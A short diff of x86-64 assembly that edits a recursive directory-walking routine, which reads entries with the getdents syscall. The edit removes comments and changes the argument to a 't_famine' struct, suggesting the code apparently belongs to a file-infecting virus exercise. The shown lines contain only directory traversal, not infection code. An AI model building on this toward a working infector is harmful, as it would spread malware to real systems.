@@ -3,18 +3,13 @@
 
 %include "ft_strlen.s"
 
-;	int recursive(char *path)
-;	r8	=> buff[4096]
-;	r12 => fd
-;	r13 => idx
-;	r14 => type
-;	r8 => read
+;	int recursive(t_famine *famine)
 recursive:
 	push rbp
 	mov rbp, rsp
 	sub rsp, READ_DIR_BUFF_SIZE
 	;open:
-	mov r12, rdi			;  buff[4096]
+	mov r12, rdi
 	cmp r12, 0
 	jz recursive_exit
 	lea rdi, [r12 + fileName]
@@ -30,8 +25,8 @@ recursive:
 	;getents
 	loop_dir:
 	mov rdi, r15		; fd
-	mov rsi, rsp		; buff[300]
-	mov rdx, READ_DIR_BUFF_SIZE	; 300
+	mov rsi, rsp
+	mov rdx, READ_DIR_BUFF_SIZE
 	mov rax, SYS_GETDENTS
 	syscall
 	mov r14, rax		; byte read
